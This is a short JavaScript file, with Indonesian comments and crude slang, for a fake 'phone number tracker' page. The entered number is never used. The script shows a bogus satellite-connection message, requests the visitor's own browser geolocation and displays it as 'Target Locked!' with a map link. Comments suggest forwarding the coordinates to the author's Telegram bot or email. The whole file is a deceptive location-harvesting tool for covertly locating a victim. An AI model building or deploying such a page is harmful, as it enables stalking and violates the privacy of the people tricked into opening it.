function startTracking() {
    const phone = document.getElementById('phone').value;
    if (phone === "") {
        alert("Masukin nomornya dulu, anjg! 🖕");
        return;
    }

    document.getElementById('status').innerText = "Menghubungkan ke Satelit... 🛰️";

    // Minta izin lokasi (Ini intinya!)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
    } else {
        alert("Browser target cupu, gak support GPS.");
    }
}

function showPosition(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    document.getElementById('status').innerText = "KOORDINAT DITEMUKAN! 😈🚀";
    
    // Nampilin hasil ke user (atau lo bisa kirim ke bot Telegram lo)
    const resultDiv = document.getElementById('result');
    resultDiv.classList.remove('hidden');
    resultDiv.innerHTML = `
        <h3>Target Locked!</h3>
        <p>Latitude: ${lat}</p>
        <p>Longitude: ${lon}</p>
        <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="color:cyan;">Buka di Google Maps 📍</a>
    `;

    console.log(`Target Location: ${lat}, ${lon}`);
    // DISINI lo bisa tambahin kode buat kirim data lat/lon ke email atau Telegram lo
}

function showError(error) {
    document.getElementById('status').innerText = "Gagal! Target nolak kasih izin lokasi. 😮‍💨";
}
